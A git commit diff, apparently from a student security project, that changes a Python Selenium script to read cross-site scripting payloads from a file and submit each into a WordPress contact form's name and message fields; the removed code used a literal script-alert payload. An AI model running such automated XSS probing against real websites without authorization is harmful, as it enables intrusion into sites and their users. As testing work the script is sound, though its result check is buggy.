7fa28aec81f1a88a9513519f113b49f8b77c8b59
caldwella2 <caldwella2@allegheny.edu>
2023-03-22 13:04:36 -0400

    added payload to ninjaforms.py

--- ninjaForms.py
+++ ninjaForms.py
@@ -10,44 +10,47 @@ import os
 
 def reflectedCrossSite(url):
     results = []
+    test = 1
+    with open('xssPayloads.txt', 'r') as f:
+        lines = f.readlines()
+        for line in lines:
+            # name and message  ==============================================================================
+            try:
+                print("\n\t [+] Test #1")
+                options = Options()
+                options.headless = True
+                s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
+                driver = webdriver.Chrome(service=s, options=options) # path to chromedriver
+                driver.get(url)
+                # This finds the element and passes in a script
+                driver.find_element(By.NAME, 'your-name').send_keys(line)
+                driver.find_element(By.NAME, 'your-message').send_keys(line)
+                print("\n\t [+] HTML elements found:\n")
+                # this finds the button
+                button = driver.find_element(By.XPATH, "//input[@type='submit']")
+                # this clicks the button
+                driver.execute_script("arguments[0].click();", button)
+                print("\n\t [+] Button was successfully pressed:\n")
+                driver.implicitly_wait(15)
+                # by class name
+                checkAlert = driver.find_element(By.CLASS_NAME, 'wpcf7-response-output')
+                mailSentOK = "Thank you for your message. It has been sent."
+                print("\n\t [+] HTML elements found:\n")
+                print(checkAlert.getText())
+                if (checkAlert == mailSentOK):
+                    print("\n\t [+] Email was successfully sent.")
+                    driver.quit() # closes the window
+                    results.append(True)
+                else:
+                    print("\n\t [+] Email was not sent successfully.")
+                    results.append(False)
+            except KeyboardInterrupt:
+                print("\n\t [+] KeyboardInterrupt exception caught.")
+                sys.exit()
+            except:
+                print("\n\t [+] Element does not exist.")
+                results.append(False)
 
-    # name and message  ==============================================================================
-    try:
-        print("\n\t [+] Test #1")
-        options = Options()
-        options.headless = True
-        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
-        driver = webdriver.Chrome(service=s, options=options) # path to chromedriver
-        driver.get(url)
-        # This finds the element and passes in a script
-        driver.find_element(By.NAME, 'your-name').send_keys("<script>alert('alert')</script>")
-        driver.find_element(By.NAME, 'your-message').send_keys("Message trial #2")
-        print("\n\t [+] HTML elements found:\n")
-        # this finds the button
-        button = driver.find_element(By.XPATH, "//input[@type='submit']")
-        # this clicks the button
-        driver.execute_script("arguments[0].click();", button)
-        print("\n\t [+] Button was successfully pressed:\n")
-        driver.implicitly_wait(15)
-        # by class name
-        checkAlert = driver.find_element(By.CLASS_NAME, 'wpcf7-response-output')
-        mailSentOK = "Thank you for your message. It has been sent."
-        print("\n\t [+] HTML elements found:\n")
-        print(checkAlert.getText())
-        if (checkAlert == mailSentOK):
-            print("\n\t [+] Email was successfully sent.")
-            driver.quit() # closes the window
-            results.append(True)
-        else:
-            print("\n\t [+] Email was not sent successfully.")
-            results.append(False)
-    except KeyboardInterrupt:
-        print("\n\t [+] KeyboardInterrupt exception caught.")
-        sys.exit()
-    except:
-        print("\n\t [+] Element does not exist.")
-        results.append(False)
-        
     # grabs total results
     total_results = results.count(True) +  results.count(False)
     print(f"\n\t [+] Number of successful tries: {results.count(True)} out of {total_results}")
